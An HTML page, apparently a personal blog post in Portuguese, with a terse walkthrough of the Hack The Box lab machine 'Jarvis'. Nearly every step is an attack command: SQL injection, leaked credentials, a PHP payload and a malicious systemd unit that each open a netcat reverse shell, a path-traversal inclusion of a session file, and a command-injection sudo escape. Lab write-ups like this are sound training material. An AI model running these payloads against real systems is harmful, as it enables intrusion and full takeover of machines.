@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset='utf-8'>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="/style/style.css">
+<title> marcelo's place</title>
+</head>
+<body>
+<header>
+	<div class="container">
+	<h1>HTB Jarvis writeup</h1>
+	</div>
+</header>
+<div class ="container">
+	<section id="writeup">
+    <p>sql injection nos quartos, usa sqlmap</p>
+    <p>vai achar o usuario DBadmin com senha imissyou</p>
+    <p>conecta no 10.10.10.143/phpmyadmin/server_sql.php</p>
+    <p>exploit: select '<?php system("nc -e /bin/bash 10.10.13.88 12345")?>'</p>
+    <p>intercepta antes de dar go e pega o valor do cookie phpmyadmin</p>
+    <p>vai na page http://10.10.10.143/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_TOKENCOOKIEPHPMYADMINAQUI</p>
+    <p>isso vai executar o c&oacute;digo que foi passado no system(&quot;...&quot;)</p>
+    <p>low priv shell</p>
+
+    <p>
+    sudo -l mostra que o script em /var/www/Admin-Utilities pode ser usado como o usuario pepper</p>
+    <p>sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</p>
+    <p>comando a ser executado pra escape shell &eacute; $(/bin/bash)</p>
+    <p>passa um nc -e /bin/bash para outra shell e user done</p>
+
+    <p>como user, executando a enumeração padrão já é possível ver que o /bin/systemctl é do usuário root e tem suid ativado</p>
+    <p>aqui aprendi coisa nova, como escrever um serviço do linux, que nesse caso vai ser explorado pelo systemctl</p>
+    <p>serviço para abrir shell:</p>
+
+    <p>[Unit]<br />
+    Description=PWNED</p>
+
+    <p>[Service]<br />
+    Type=simple<br />
+    ExecStart=/bin/nc -e /bin/bash 10.10.12.177 12346</p>
+
+    <p>[Install]<br />
+    WantedBy=multi-user.target</p>
+
+    <p>escrever isso em algum arquivo no servidor e utilizar "systemctl enable exploit.service", e depois "systemctl start exploit.service"</p>
+    <p>rooted</p>
+	    
+</body>
+</html>
